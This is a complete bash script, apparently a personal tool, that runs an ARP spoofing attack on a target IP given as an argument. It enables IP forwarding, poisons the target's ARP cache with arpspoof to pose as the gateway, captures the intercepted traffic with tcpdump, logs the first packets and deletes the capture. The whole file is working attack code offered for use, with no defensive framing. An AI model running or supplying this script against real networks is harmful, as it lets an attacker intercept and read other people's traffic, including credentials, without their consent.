#!/bin/bash

TARGET_IP=$1
LOG_FILE="/home/rb/arp_attack_logs.txt"
GATEWAY_IP="192.168.2.1"  # Update with your real gateway IP

# Function to log messages
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a $LOG_FILE
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    log_message "Please run as root"
    exit 1
fi

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
log_message "IP forwarding enabled"

# Start ARP spoofing
log_message "Starting ARP spoofing attack on $TARGET_IP"
timeout 60 arpspoof -i eth0 -t $TARGET_IP $GATEWAY_IP &  # Runs for 60 sec
SPOOF_PID=$!

# Monitor & Log Traffic
log_message "Monitoring traffic with tcpdump"
tcpdump -i eth0 -w /tmp/captured_traffic.pcap &
TCPDUMP_PID=$!

# Let the attack run for a while
sleep 60

# Stop Attack & Traffic Capture
kill $SPOOF_PID
kill $TCPDUMP_PID
echo 0 > /proc/sys/net/ipv4/ip_forward

# Analyze results
log_message "Analyzing captured traffic..."
tcpdump -r /tmp/captured_traffic.pcap | head -n 10 >> $LOG_FILE

# Cleanup
rm /tmp/captured_traffic.pcap
log_message "ARP spoofing attack completed"
